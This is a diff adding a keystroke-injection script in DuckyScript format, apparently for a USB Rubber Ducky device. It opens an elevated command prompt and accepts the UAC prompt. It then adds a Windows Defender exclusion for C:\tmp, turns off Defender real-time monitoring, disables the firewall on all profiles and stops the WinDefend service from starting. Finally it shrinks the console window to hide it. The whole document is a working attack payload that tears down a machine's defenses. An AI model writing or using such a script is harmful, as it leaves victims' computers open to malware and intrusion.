@@ -1,0 +1,41 @@
+DELAY 2500 
+
+DEFAULT_DELAY 100
+
+GUI r
+
+STRING_DELAY 50 cmd
+
+CTRL SHIFT ENTER
+
+DELAY 400
+
+ALT y
+
+STRING_DELAY 50 mkdir C:\tmp
+
+DELAY 600
+
+STRING_DELAY 50 powershell -Command Add-MpPreference -ExclusionPath "C:\tmp" & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & netsh advfirewall set allprofiles state off & sc config WinDefend start= disabled
+
+ENTER
+
+REM TRYING TO HIDE CMD##
+
+ALT SPACE
+
+STRING m
+
+LEFTARROW
+
+REPEAT 50
+
+STRING [console]::WindowHeight=1
+
+ENTER
+
+STRING [console]::WindowWidth=1
+
+ENTER
+
+
